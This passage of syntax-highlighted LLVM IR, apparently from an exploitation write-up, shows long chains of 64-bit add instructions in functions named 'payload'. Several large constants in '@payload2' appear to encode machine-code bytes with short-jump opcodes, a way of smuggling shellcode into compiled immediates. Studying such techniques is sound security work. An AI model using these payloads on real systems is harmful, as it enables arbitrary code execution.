class="number">88</span> = add nsw i64 %<span class="number">87</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">89</span> = add nsw i64 %<span class="number">88</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">90</span> = add nsw i64 %<span class="number">89</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">91</span> = add nsw i64 %<span class="number">90</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">92</span> = add nsw i64 %<span class="number">91</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">93</span> = add nsw i64 %<span class="number">92</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">94</span> = add nsw i64 %<span class="number">93</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">95</span> = add nsw i64 %<span class="number">94</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">96</span> = add nsw i64 %<span class="number">95</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">97</span> = add nsw i64 %<span class="number">96</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">98</span> = add nsw i64 %<span class="number">97</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">99</span> = add nsw i64 %<span class="number">98</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">100</span> = add nsw i64 %<span class="number">99</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">101</span> = add nsw i64 %<span class="number">100</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">102</span> = add nsw i64 %<span class="number">101</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">103</span> = add nsw i64 %<span class="number">102</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">104</span> = add nsw i64 %<span class="number">103</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">105</span> = add nsw i64 %<span class="number">104</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">106</span> = add nsw i64 %<span class="number">105</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">107</span> = add nsw i64 %<span class="number">106</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">108</span> = add nsw i64 %<span class="number">107</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">109</span> = add nsw i64 %<span class="number">108</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">110</span> = add nsw i64 %<span class="number">109</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">111</span> = add nsw i64 %<span class="number">110</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">112</span> = add nsw i64 %<span class="number">111</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">113</span> = add nsw i64 %<span class="number">112</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">114</span> = add nsw i64 %<span class="number">113</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">115</span> = add nsw i64 %<span class="number">114</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">116</span> = add nsw i64 %<span class="number">115</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">117</span> = add nsw i64 %<span class="number">116</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">118</span> = add nsw i64 %<span class="number">117</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">119</span> = add nsw i64 %<span class="number">118</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">120</span> = add nsw i64 %<span class="number">119</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">121</span> = add nsw i64 %<span class="number">120</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">122</span> = add nsw i64 %<span class="number">121</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">123</span> = add nsw i64 %<span class="number">122</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">124</span> = add nsw i64 %<span class="number">123</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">125</span> = add nsw i64 %<span class="number">124</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">126</span> = add nsw i64 %<span class="number">125</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">127</span> = add nsw i64 %<span class="number">126</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">128</span> = add nsw i64 %<span class="number">127</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">129</span> = add nsw i64 %<span class="number">128</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">130</span> = add nsw i64 %<span class="number">129</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">131</span> = add nsw i64 %<span class="number">130</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">132</span> = add nsw i64 %<span class="number">131</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">133</span> = add nsw i64 %<span class="number">132</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">134</span> = add nsw i64 %<span class="number">133</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">135</span> = add nsw i64 %<span class="number">134</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">136</span> = add nsw i64 %<span class="number">135</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">137</span> = add nsw i64 %<span class="number">136</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">138</span> = add nsw i64 %<span class="number">137</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">139</span> = add nsw i64 %<span class="number">138</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">140</span> = add nsw i64 %<span class="number">139</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">141</span> = add nsw i64 %<span class="number">140</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">142</span> = add nsw i64 %<span class="number">141</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">143</span> = add nsw i64 %<span class="number">142</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">144</span> = add nsw i64 %<span class="number">143</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">145</span> = add nsw i64 %<span class="number">144</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">146</span> = add nsw i64 %<span class="number">145</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">147</span> = add nsw i64 %<span class="number">146</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">148</span> = add nsw i64 %<span class="number">147</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">149</span> = add nsw i64 %<span class="number">148</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">150</span> = add nsw i64 %<span class="number">149</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">151</span> = add nsw i64 %<span class="number">150</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">152</span> = add nsw i64 %<span class="number">151</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">153</span> = add nsw i64 %<span class="number">152</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">154</span> = add nsw i64 %<span class="number">153</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">155</span> = add nsw i64 %<span class="number">154</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">156</span> = add nsw i64 %<span class="number">155</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">157</span> = add nsw i64 %<span class="number">156</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">158</span> = add nsw i64 %<span class="number">157</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">159</span> = add nsw i64 %<span class="number">158</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">160</span> = add nsw i64 %<span class="number">159</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">161</span> = add nsw i64 %<span class="number">160</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">162</span> = add nsw i64 %<span class="number">161</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">163</span> = add nsw i64 %<span class="number">162</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">164</span> = add nsw i64 %<span class="number">163</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">165</span> = add nsw i64 %<span class="number">164</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">166</span> = add nsw i64 %<span class="number">165</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">167</span> = add nsw i64 %<span class="number">166</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">168</span> = add nsw i64 %<span class="number">167</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">169</span> = add nsw i64 %<span class="number">168</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">170</span> = add nsw i64 %<span class="number">169</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">171</span> = add nsw i64 %<span class="number">170</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">172</span> = add nsw i64 %<span class="number">171</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">173</span> = add nsw i64 %<span class="number">172</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">174</span> = add nsw i64 %<span class="number">173</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">175</span> = add nsw i64 %<span class="number">174</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">176</span> = add nsw i64 %<span class="number">175</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">177</span> = add nsw i64 %<span class="number">176</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">178</span> = add nsw i64 %<span class="number">177</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">179</span> = add nsw i64 %<span class="number">178</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">180</span> = add nsw i64 %<span class="number">179</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">181</span> = add nsw i64 %<span class="number">180</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">182</span> = add nsw i64 %<span class="number">181</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">183</span> = add nsw i64 %<span class="number">182</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">184</span> = add nsw i64 %<span class="number">183</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">185</span> = add nsw i64 %<span class="number">184</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">186</span> = add nsw i64 %<span class="number">185</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">187</span> = add nsw i64 %<span class="number">186</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">188</span> = add nsw i64 %<span class="number">187</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">189</span> = add nsw i64 %<span class="number">188</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">190</span> = add nsw i64 %<span class="number">189</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">191</span> = add nsw i64 %<span class="number">190</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">192</span> = add nsw i64 %<span class="number">191</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">193</span> = add nsw i64 %<span class="number">192</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">194</span> = add nsw i64 %<span class="number">193</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">195</span> = add nsw i64 %<span class="number">194</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">196</span> = add nsw i64 %<span class="number">195</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">197</span> = add nsw i64 %<span class="number">196</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">198</span> = add nsw i64 %<span class="number">197</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">199</span> = add nsw i64 %<span class="number">198</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">200</span> = add nsw i64 %<span class="number">199</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">201</span> = add nsw i64 %<span class="number">200</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">202</span> = add nsw i64 %<span class="number">201</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">203</span> = add nsw i64 %<span class="number">202</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">204</span> = add nsw i64 %<span class="number">203</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">205</span> = add nsw i64 %<span class="number">204</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">206</span> = add nsw i64 %<span class="number">205</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">207</span> = add nsw i64 %<span class="number">206</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">208</span> = add nsw i64 %<span class="number">207</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">209</span> = add nsw i64 %<span class="number">208</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">210</span> = add nsw i64 %<span class="number">209</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">211</span> = add nsw i64 %<span class="number">210</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">212</span> = add nsw i64 %<span class="number">211</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">213</span> = add nsw i64 %<span class="number">212</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">214</span> = add nsw i64 %<span class="number">213</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">215</span> = add nsw i64 %<span class="number">214</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">216</span> = add nsw i64 %<span class="number">215</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">217</span> = add nsw i64 %<span class="number">216</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">218</span> = add nsw i64 %<span class="number">217</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">219</span> = add nsw i64 %<span class="number">218</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">220</span> = add nsw i64 %<span class="number">219</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">221</span> = add nsw i64 %<span class="number">220</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">222</span> = add nsw i64 %<span class="number">221</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">223</span> = add nsw i64 %<span class="number">222</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">224</span> = add nsw i64 %<span class="number">223</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">225</span> = add nsw i64 %<span class="number">224</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">226</span> = add nsw i64 %<span class="number">225</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">227</span> = add nsw i64 %<span class="number">226</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">228</span> = add nsw i64 %<span class="number">227</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">229</span> = add nsw i64 %<span class="number">228</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">230</span> = add nsw i64 %<span class="number">229</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">231</span> = add nsw i64 %<span class="number">230</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">232</span> = add nsw i64 %<span class="number">231</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">233</span> = add nsw i64 %<span class="number">232</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">234</span> = add nsw i64 %<span class="number">233</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">235</span> = add nsw i64 %<span class="number">234</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">236</span> = add nsw i64 %<span class="number">235</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">237</span> = add nsw i64 %<span class="number">236</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">238</span> = add nsw i64 %<span class="number">237</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">239</span> = add nsw i64 %<span class="number">238</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">240</span> = add nsw i64 %<span class="number">239</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">241</span> = add nsw i64 %<span class="number">240</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">242</span> = add nsw i64 %<span class="number">241</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">243</span> = add nsw i64 %<span class="number">242</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">244</span> = add nsw i64 %<span class="number">243</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">245</span> = add nsw i64 %<span class="number">244</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">246</span> = add nsw i64 %<span class="number">245</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">247</span> = add nsw i64 %<span class="number">246</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">248</span> = add nsw i64 %<span class="number">247</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">249</span> = add nsw i64 %<span class="number">248</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">250</span> = add nsw i64 %<span class="number">249</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">251</span> = add nsw i64 %<span class="number">250</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">252</span> = add nsw i64 %<span class="number">251</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">253</span> = add nsw i64 %<span class="number">252</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">254</span> = add nsw i64 %<span class="number">253</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">255</span> = add nsw i64 %<span class="number">254</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">256</span> = add nsw i64 %<span class="number">255</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">257</span> = add nsw i64 %<span class="number">256</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">258</span> = add nsw i64 %<span class="number">257</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">259</span> = add nsw i64 %<span class="number">258</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">260</span> = add nsw i64 %<span class="number">259</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">261</span> = add nsw i64 %<span class="number">260</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">262</span> = add nsw i64 %<span class="number">261</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">263</span> = add nsw i64 %<span class="number">262</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">264</span> = add nsw i64 %<span class="number">263</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">265</span> = add nsw i64 %<span class="number">264</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">266</span> = add nsw i64 %<span class="number">265</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">267</span> = add nsw i64 %<span class="number">266</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">268</span> = add nsw i64 %<span class="number">267</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">269</span> = add nsw i64 %<span class="number">268</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">270</span> = add nsw i64 %<span class="number">269</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">271</span> = add nsw i64 %<span class="number">270</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">272</span> = add nsw i64 %<span class="number">271</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">273</span> = add nsw i64 %<span class="number">272</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">274</span> = add nsw i64 %<span class="number">273</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">275</span> = add nsw i64 %<span class="number">274</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">276</span> = add nsw i64 %<span class="number">275</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">277</span> = add nsw i64 %<span class="number">276</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">278</span> = add nsw i64 %<span class="number">277</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">279</span> = add nsw i64 %<span class="number">278</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">280</span> = add nsw i64 %<span class="number">279</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">281</span> = add nsw i64 %<span class="number">280</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">282</span> = add nsw i64 %<span class="number">281</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">283</span> = add nsw i64 %<span class="number">282</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">284</span> = add nsw i64 %<span class="number">283</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">285</span> = add nsw i64 %<span class="number">284</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">286</span> = add nsw i64 %<span class="number">285</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">287</span> = add nsw i64 %<span class="number">286</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">288</span> = add nsw i64 %<span class="number">287</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">289</span> = add nsw i64 %<span class="number">288</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">290</span> = add nsw i64 %<span class="number">289</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">291</span> = add nsw i64 %<span class="number">290</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">292</span> = add nsw i64 %<span class="number">291</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">293</span> = add nsw i64 %<span class="number">292</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">294</span> = add nsw i64 %<span class="number">293</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">295</span> = add nsw i64 %<span class="number">294</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">296</span> = add nsw i64 %<span class="number">295</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">297</span> = add nsw i64 %<span class="number">296</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">298</span> = add nsw i64 %<span class="number">297</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">299</span> = add nsw i64 %<span class="number">298</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">300</span> = add nsw i64 %<span class="number">299</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">301</span> = add nsw i64 %<span class="number">300</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">302</span> = add nsw i64 %<span class="number">301</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">303</span> = add nsw i64 %<span class="number">302</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">304</span> = add nsw i64 %<span class="number">303</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">305</span> = add nsw i64 %<span class="number">304</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">306</span> = add nsw i64 %<span class="number">305</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">307</span> = add nsw i64 %<span class="number">306</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">308</span> = add nsw i64 %<span class="number">307</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">309</span> = add nsw i64 %<span class="number">308</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">310</span> = add nsw i64 %<span class="number">309</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">311</span> = add nsw i64 %<span class="number">310</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">312</span> = add nsw i64 %<span class="number">311</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">313</span> = add nsw i64 %<span class="number">312</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">314</span> = add nsw i64 %<span class="number">313</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">315</span> = add nsw i64 %<span class="number">314</span>, <span class="number">1024</span></span><br><span class="line">  ret i64 %<span class="number">315</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define dso_local i64 @payload2(i64 %<span class="number">0</span>) #<span class="number">0</span> &#123;</span><br><span class="line">  %<span class="number">2</span> = add nsw i64 %<span class="number">0</span>, <span class="number">1</span></span><br><span class="line">  %<span class="number">3</span> = add nsw i64 %<span class="number">2</span>, <span class="number">1</span></span><br><span class="line">  %<span class="number">4</span> = add nsw i64 %<span class="number">3</span>, <span class="number">1</span></span><br><span class="line">  %<span class="number">5</span> = add nsw i64 %<span class="number">4</span>, <span class="number">1</span></span><br><span class="line">  %<span class="number">6</span> = add nsw i64 %<span class="number">5</span>, <span class="number">1</span></span><br><span class="line">  %<span class="number">7</span> = add nsw i64 %<span class="number">6</span>, <span class="number">16999839996723556031</span></span><br><span class="line">  %<span class="number">8</span> = add nsw i64 %<span class="number">7</span>, <span class="number">16999840167007600968</span></span><br><span class="line">  %<span class="number">9</span> = add nsw i64 %<span class="number">8</span>, <span class="number">16999839549882511291</span></span><br><span class="line">  %<span class="number">10</span> = add nsw i64 %<span class="number">9</span>, <span class="number">16999840169020293448</span></span><br><span class="line">  %<span class="number">11</span> = add nsw i64 %<span class="number">10</span>, <span class="number">16999840169015152727</span></span><br><span class="line">  %<span class="number">12</span> = add nsw i64 %<span class="number">11</span>, <span class="number">16999840169015152724</span></span><br><span class="line">  %<span class="number">13</span> = add nsw i64 %<span class="number">12</span>, <span class="number">16999840169015152735</span></span><br><span class="line">  %<span class="number">14</span> = add nsw i64 %<span class="number">13</span>, <span class="number">16999840169021813064</span></span><br><span class="line">  %<span class="number">15</span> = add nsw i64 %<span class="number">14</span>, <span class="number">16999840169019453768</span></span><br><span class="line">  %<span class="number">16</span> = add nsw i64 %<span class="number">15</span>, <span class="number">16999840169015130986</span></span><br><span class="line">  %<span class="number">17</span> = add nsw i64 %<span class="number">16</span>, <span class="number">16999840169015152728</span></span><br><span class="line">  %<span class="number">18</span> = add nsw i64 %<span class="number">17</span>, <span class="number">16999840169015117071</span></span><br><span class="line">  %<span class="number">19</span> = add nsw i64 %<span class="number">18</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">20</span> = add nsw i64 %<span class="number">19</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">21</span> = add nsw i64 %<span class="number">20</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">22</span> = add nsw i64 %<span class="number">21</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">23</span> = add nsw i64 %<span class="number">22</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">24</span> = add nsw i64 %<span class="number">23</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">25</span> = add nsw i64 %<span class="number">24</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">26</span> = add nsw i64 %<span class="number">25</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">27</span> = add nsw i64 %<span class="number">26</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">28</span> = add nsw i64 %<span class="number">27</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">29</span> = add nsw i64 %<span class="number">28</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">30</span> = add nsw i64 %<span class="number">29</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">31</span> = add nsw i64 %<span class="number">30</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">32</span> = add nsw i64 %<span class="number">31</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">33</span> = add nsw i64 %<span class="number">32</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">34</span> = add nsw i64 %<span class="number">33</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">35</span> = add nsw i64 %<span class="number">34</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">36</span> = add nsw i64 %<span class="number">35</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">37</span> = add nsw i64 %<span class="number">36</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">38</span> = add nsw i64 %<span class="number">37</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">39</span> = add nsw i64 %<span class="number">38</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">40</span> = add nsw i64 %<span class="number">39</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">41</span> = add nsw i64 %<span class="number">40</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">42</span> = add nsw i64 %<span class="number">41</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">43</span> = add nsw i64 %<span class="number">42</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">44</span> = add nsw i64 %<span class="number">43</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">45</span> = add nsw i64 %<span class="number">44</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">46</span> = add nsw i64 %<span class="number">45</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">47</span> = add nsw i64 %<span class="number">46</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">48</span> = add nsw i64 %<span class="number">47</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">49</span> = add nsw i64 %<span class="number">48</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">50</span> = add nsw i64 %<span class="number">49</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">51</span> = add nsw i64 %<span class="number">50</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">52</span> = add nsw i64 %<span class="number">51</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">53</span> = add nsw i64 %<span class="number">52</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">54</span> = add nsw i64 %<span class="number">53</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">55</span> = add nsw i64 %<span class="number">54</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">56</span> = add nsw i64 %<span class="number">55</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">57</span> = add nsw i64 %<span class="number">56</span>, <span class="number">1024</span></span><br><span class="line">  %<span class="number">58</span> = add nsw i64 %<span class="number">57</span>, <span 